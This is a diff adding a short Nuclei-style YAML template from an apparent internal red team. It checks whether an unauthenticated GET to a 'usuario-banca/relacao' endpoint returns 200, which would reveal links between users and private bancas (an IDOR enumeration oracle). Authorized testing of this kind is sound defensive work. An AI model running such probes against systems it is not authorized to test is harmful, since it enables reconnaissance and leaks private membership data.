@@ -1,0 +1,16 @@
+id: rt10-probe-relacao-banca-privada-anon
+info:
+  name: "Anonimo confirma (200) relacao usuario-banca da banca PRIVADA - endpoint /usuario-banca/relacao sem guard"
+  author: redteam-sisdef
+  severity: low
+  description: "GET /banca/usuario-banca/relacao/banca/:bancaId/usuario/:userId sem guard: oraculo de existencia de vinculos em bancas privadas (enumeracao cega)."
+  tags: redteam,idor,recon
+http:
+  - raw:
+      - |
+        GET /banca/usuario-banca/relacao/banca/3/usuario/7 HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
